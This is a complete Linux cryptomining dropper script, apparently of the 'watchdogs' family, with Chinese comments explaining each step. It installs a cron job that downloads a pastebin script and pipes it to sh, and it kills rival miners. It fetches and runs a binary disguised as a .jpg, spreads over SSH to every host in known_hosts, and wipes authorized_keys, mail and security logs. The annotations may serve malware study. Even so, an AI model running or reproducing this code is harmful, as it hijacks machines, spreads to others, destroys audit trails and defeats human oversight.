export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin

echo "*/10 * * * * (curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh" | crontab -    # 定时下载执行病毒文件

ps auxf | grep -v grep | grep hwlh3wlh44lh | awk '{print $2}' | xargs kill -9           # 结束其他挖矿进程 
ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep /usr/bin/.sshd | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep /usr/bin/bsd-port | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "kworkerds" | awk '{print $2}'|xargs kill -9

chattr -i /etc/cron.d/root                  # 修改目录属性
chattr -i /etc/cron.d/system
chattr -i /etc/ld.so.preload
chattr -i /etc/cron.d/apache
chattr -i /var/spool/cron/root
chattr -i /var/spool/cron/crontabs/root
chattr -i /usr/local/bin/dns
chattr -i /usr/sbin/netdns
chattr -i /bin/netstat

# 删除定时任务
rm -rf /etc/cron.d/system /etc/cron.d/apache /etc/cron.hourly/oanacron /etc/cron.daily/oanacron /etc/cron.monthly/oanacron /usr/local/lib/libntp.so /etc/init.d/netdns /etc/init.d/kworker /bin/httpdns /usr/local/bin/dns /bin/netstat /usr/sbin/netdns

chkconfig --del kworker     # 删除服务
chkconfig --del netdns

p=$(ps auxf|grep -v grep|grep ksoftirqds|wc -l)     # 结束CPU占用率80%以上的进程
if [ ${p} -eq 0 ];then
    ps auxf|grep -v grep | awk '{if($3>=80.0) print $2}'| xargs kill -9
fi

if [ -e "/tmp/gates.lod" ]; then    # 杀死billgates病毒
    rm -rf $(readlink /proc/$(cat /tmp/gates.lod)/exe)
    kill -9 $(cat /tmp/gates.lod)
    rm -rf $(readlink /proc/$(cat /tmp/moni.lod)/exe)
    kill -9 $(cat /tmp/moni.lod)
    rm -rf /tmp/{gates,moni}.lod
fi

if [ ! -f "/tmp/.lsdpid" ]; then      # 下载watchdog病毒并运行
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    elif [ ${ARCH}x = "i686x" ]; then
        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    else
        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    fi
        nohup /tmp/watchdogs >/dev/null 2>&1 &
elif [ ! -f "/proc/$(cat /tmp/.lsdpid)/stat" ]; then
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    elif [ ${ARCH}x = "i686x" ]; then
        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    else
        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    fi
        nohup /tmp/watchdogs >/dev/null 2>&1 &
fi

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh >/dev/null 2>&1 &' & done
fi
echo 0>/root/.ssh/authorized_keys   # 删除ssh密钥
echo 0>/var/spool/mail/root         # 清除邮箱
echo 0>/var/log/wtmp				# 清除登陆信息
echo 0>/var/log/secure				# 清除安全日志
echo 0>/var/log/cron 				# 清除定时任务日志